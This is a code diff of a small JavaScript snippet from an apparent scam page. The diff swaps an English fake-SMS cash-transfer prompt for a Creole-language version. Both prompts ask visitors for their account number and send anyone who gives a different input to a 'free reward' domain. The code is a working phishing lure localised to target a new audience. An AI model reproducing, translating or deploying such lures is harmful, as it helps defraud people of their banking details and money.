@@ -1,9 +1,9 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'WITHDRAW CASH'
+var password = 'RETIR LARZAN'
 password = prompt(
-  'SMS: Congratulations! You are eligible to receive NAFA CASH TRANSFER. Please press OK to Enter your Account Number.',
-  'WITHDRAW CASH'
+  'SMS: Felisitasyon! Ou kalifye pou resevwar GRAN SIPOR. Silvouple, apiy lo OK pou antre ou nimero kont.',
+  'RETIR LARZAN'
 ); 
-if (password != 'WITHDRAW CASH') {
+if (password != 'RETIR LARZAN') {
   location.href = 'https://new-year-free-reward.cfd/Sipor.html';
   }
